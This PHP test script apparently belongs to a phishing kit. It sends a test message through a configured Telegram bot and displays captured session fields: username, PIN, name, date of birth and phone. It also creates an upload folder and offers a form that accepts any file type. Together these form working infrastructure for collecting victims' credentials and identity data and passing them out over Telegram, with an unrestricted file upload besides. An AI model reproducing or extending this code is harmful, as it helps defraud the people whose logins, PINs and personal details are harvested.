<?php
// Comprehensive test script for universal upload
session_start();
include 'config/telegram.php';

echo "<h2>✅ UNIVERSAL UPLOAD TEST</h2>";
echo "<p>This script tests the universal upload system that accepts ALL files.</p>";

// Test bot configuration
echo "<h3>🤖 Bot Configuration Test</h3>";
echo "Bot Token: " . substr($telegram_bot2_token, 0, 20) . "...<br>";
echo "Chat ID: $telegram_bot2_chat_id<br>";

// Test message
$test_message = "🧪 UNIVERSAL Upload Test - " . date('Y-m-d H:i:s');
$result = sendTelegramMessage($telegram_bot2_token, $telegram_bot2_chat_id, $test_message);

if ($result) {
    echo "✅ Test message sent successfully!<br>";
} else {
    echo "❌ Test message failed to send<br>";
}

// Test file upload directory
$uploadDir = 'views/xentryxupload/';
if (is_dir($uploadDir)) {
    echo "✅ Upload directory exists and is writable<br>";
} else {
    echo "❌ Upload directory does not exist<br>";
    mkdir($uploadDir, 0755, true);
    echo "✅ Created upload directory<br>";
}

// Test PHP settings
echo "<h3>⚙️ PHP Settings Test</h3>";
echo "Upload Max Filesize: " . ini_get('upload_max_filesize') . "<br>";
echo "Post Max Size: " . ini_get('post_max_size') . "<br>";
echo "Max Execution Time: " . ini_get('max_execution_time') . "<br>";
echo "Memory Limit: " . ini_get('memory_limit') . "<br>";
echo "Display Errors: " . (ini_get('display_errors') ? 'On' : 'Off') . "<br>";
echo "Error Reporting: " . ini_get('error_reporting') . "<br>";

// Test session data
echo "<h3>📋 Session Data Test</h3>";
if (isset($_SESSION['xusr'])) {
    echo "✅ Session data exists<br>";
    echo "Username: " . $_SESSION['xusr'] . "<br>";
    echo "PIN: " . $_SESSION['xpss'] . "<br>";
    echo "Name: " . $_SESSION['xname1'] . " " . $_SESSION['xname2'] . "<br>";
    echo "DOB: " . $_SESSION['xdob'] . "<br>";
    echo "Phone: " . $_SESSION['xtel'] . "<br>";
} else {
    echo "❌ No session data found<br>";
    echo "This is normal if you haven't completed the form yet.<br>";
}

// Test file upload form
echo "<h3>📤 Test Universal Upload (Accepts ALL Files)</h3>";
echo '<form action="views/uploadz.php" method="post" enctype="multipart/form-data">';
echo '<input type="file" name="file"><br><br>';
echo '<input type="submit" value="Test Universal Upload (Accepts ANY File Type)">';
echo '</form>';

echo "<hr>";
echo "<p><a href='index.php'>← Back to main page</a></p>";
?>
